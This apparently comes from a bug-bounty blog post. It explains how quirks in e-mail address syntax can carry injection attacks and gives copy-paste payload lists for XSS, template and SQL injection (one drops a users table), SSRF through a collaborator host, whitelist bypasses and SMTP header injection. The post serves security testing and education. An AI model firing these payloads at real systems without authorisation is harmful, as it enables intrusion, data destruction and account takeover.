---
author: "Jann Moon"
title: "Unforgivable E-mail Butchery"
description: "Endless mutilation and syntax violence for the pursuit of forced injection into your servers"
tags: ["bug bounty", "payloads", "injection vulnerabilities", "web hacking"]
date: 2023-11-03
thumbnail: floral11.jpg
---

**NOTE** A hefty part of this information comes from an awesome talk by Securiniti available here: https://www.youtube.com/watch?v=Bpnc1-g3fMk
Most credit must go to this smart cybermage.

If you check the specifics of acceptable syntax and allowed characters for naming e-mail addresses and DNS servers, you'll find some contradictions across the RFC 5322, RFC 6530 and any variety of rules that e-mail providers and e-mail address aggregating web hosts have implemented.
These discrepancies can lead to sweet vulnerabilities that squeeze through the cracks of WAFs and basically, any vulnerability you can dream of can potentially be exploited through a site's e-mail input box on the user registration page.

For e-mail naming contexts, you can generally use alphanumeric and some punctuation or special symbols.

Beyond that, you may be able to use spaces, emojies, foreign characters and various unicode to trigger errors.

Within an e-mail body, desktop clients and e-mail services will not execute JavaScript injected within.  However, web-based ticket systems may potentially do so, like a vulnerability that has seemingly been scrubbed from the internet, but it involved a blind XSS on the mailgun API using this method.
Beyond blind XSS, you can sometimes discover blind RCEs, through sending php files (or their cousins) and then fuzzing to discover them uploaded on the server.

### Recon via E-mail
E-mail addresses can be a good source of recon for cracking password logins or any other information you can dig up.
You can use tools like emailhippo and verify-email.org to find email addresses associated with a domain. Some common email addresses that attackers target include:

    Customer support: support@, feedback@, service@, help@
    Ticketing: jira@, asana@, bug@, bugs@, it@, tickets@
    Miscellaneous: print@, slack@, upload@, test@, tweet@

### Ignored Parts of an Email
Certain parts of an email can be ignored by most email servers, making them vulnerable to attacks. For example:

    The symbols +, -, and {} can be used for tagging and ignored by most email servers. For instance, john.doe+intigriti@example.com can be changed to john.doe@example.com
    Comments between parentheses at the beginning or the end of an email address will also be ignored. For example, john.doe(intigriti)@example.com can be changed to john.doe@example.com

### Whitelist bypass

* jann\(;jann@scumdestroy.com;\)@whitelisted.com
* jann@scumdestroy.com\(@whitelisted.com\)
* jann+\(@whitelisted.com;\)@scumdestroy.com

### IPs

You can also use IPs as domain named between square brackets:

* jann.moon@\[127.0.0.1\]
* jann.moon@\[IPv6:2001:db8::1\]

### Third-Party SSO Related Vulns
    XSS: Some services like Github or Salesforce allow you to create an email address with XSS payloads on it. If you can use these providers to login on other services and these services aren't sanitizing correctly the email, you could cause XSS. To prevent this, ensure that email servers are fully sanitized during preparing and sending.
    Account-Takeover: If a SSO service allows you to create an account without verifying the given email address (like Salesforce) and then you can use that account to login in a different service that trusts Salesforce, you could access any account. To prevent this, ensure that email addresses are verified before creating an account.
    Reply-To: You can send an email using From: company.com and Replay-To: attacker.com, and if any automatic reply is sent due to the email being sent from an internal address, the attacker may be able to receive that response. To prevent this, ensure that email servers are configured to block emails with suspicious reply-to addresses.


Here's a list of potentially exploitable payloads I've gathered and altered that you can try to inject into e-mail parameters on your next bug bounty campaign.

XSS (Cross-Site Scripting):
```js
test+(<script>alert(0)</script>)@example.com
test@example(<script>alert(0)</script>).com
"<script>alert(0)</script>"@example.com
```

Template injection:
```js
"<%= 7 * 7 %>"@example.com
test+(${{7*7}})@example.com
```

SQL injection:
```js
"' OR 1=1 -- '"@example.com
"mail'); DROP TABLE users;--"@example.com
```

SSRF (Server-Side Request Forgery):
```js
john.doe@abc123.burpcollaborator.net
john.doe@[127.0.0.1]
```
Note: SMTP responses pinging your collaborator server is normal but if you get an HTTP request, check for tokens or other interesting info in the body or headers.

Parameter pollution:
`victim&email=attacker@example.com`

(Email) header injection:
```js
"%0d%0aContent-Length:%200%0d%0a%0d%0a"@example.com
"recipient@test.com>\r\nRCPT TO:<victim+"@test.com
```

And if you'd like an easy list to copy and paste into Burp Suite's Intruder or FFUF, then you shall be blessed below.

```js
test+(<script>alert(0)</script>)@example.com
test@example(<script>alert(0)</script>).com
"<script>alert(0)</script>"@example.com
"<%= 7 * 7 %>"@example.com
test+(${{7*7}})@example.com
"' OR 1=1 -- '"@example.com
"mail'); DROP TABLE users;--"@example.com
john.doe@abc123.burpcollaborator.net
john.doe@[127.0.0.1]
victim&email=attacker@example.com
"%0d%0aContent-Length:%200%0d%0a%0d%0a"@example.com
"recipient@test.com>\r\nRCPT TO:<victim+"@test.com
```

Extra's I've discovered across more research...
```js
email@eaddress.com
firstname.lastname@address.com
email@subdomain.address.com
firstname+lastname@address.com
name@129.129.129.129
name@[129.129.129.129]
0123456789@address.com
email@address-one.com
email@address.name
email@address.co.jp
firstname-lastname@address.com
much."more\ unusual"@address.com
very.unusual."@".unusual.com@address.com
very."(),:;<>[]".VERY."very@\\ "very".unusual@strange.address.com
abcdefghijklmnopqrstuvwxyz!#$%&'*+-/=?^_`{|}~.0123456789@abcdefghijklmnopqrstuvwxyz-ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.com
{jacco'vantuijl}@address.server
"Jacco\@test"@address.com
"Jacco van Tuijl"@address.com
"Jacco\\test"@address.com
"Jacco@test"@address.com
Jacco/van=Tuijl@address.com
\$A12345@address.com
!def!abc%dfg@address.com
_jacco@address.com
a.long.email.address.test@dept.address.com
"jacco.vantuijl.@.address.com"@address.com
jacco@mailserver1
#!$%&'*+-/=?^_`{}|~@address.org
"()<>[]:,;@\\\"!#$%&'*+-/=?^_`{}| ~.a"@address.org
" "@address.org
üñîçøðé@address.com
address@üñîçøðé.com
üñîçøðé@üñîçøðé.com#
```  





